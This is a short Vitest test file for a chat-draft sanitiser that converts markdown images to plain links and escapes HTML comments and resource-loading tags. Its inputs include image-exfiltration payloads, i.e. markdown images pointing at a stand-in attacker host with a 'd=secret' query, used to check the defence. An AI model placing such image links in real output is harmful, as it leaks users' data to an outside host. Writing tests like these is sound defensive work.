import { describe, expect, it } from 'vitest'
import { answerDraft } from './chat-draft'

describe('answerDraft', () => {
  it('turns images into plain links, inline and reference style', () => {
    expect(answerDraft('See ![ok](https://evil.example/?d=secret) here')).toBe(
      'See [ok](https://evil.example/?d=secret) here',
    )
    expect(answerDraft('[![badge][b]](x)\n\n[b]: https://evil.example/p.png')).toBe(
      '[[badge][b]](x)\n\n[b]: https://evil.example/p.png',
    )
    // A backslash before the backtick is no code span: the image is caught anyway.
    expect(answerDraft('\\`![x](https://evil.example/)\\`')).toBe(
      '\\`[x](https://evil.example/)\\`',
    )
  })

  it('escapes HTML comments and tags that load things, whatever the case or spacing', () => {
    expect(answerDraft('a <!-- hidden --> b')).toBe('a &lt;!-- hidden --> b')
    expect(answerDraft('<IMG src=x> < video src=y> </picture><source srcset=z>')).toBe(
      '&lt;IMG src=x> &lt; video src=y> &lt;/picture>&lt;source srcset=z>',
    )
  })

  it('leaves ordinary code and text alone', () => {
    const text =
      'Use `Promise<ApplyCouponResult>` and `a < b`, see [the docs](https://x.dev).\n\n' +
      '```ts\nconst ok = !cart && list.length > 0 && <div />\n```'
    expect(answerDraft(text)).toBe(text)
  })
})
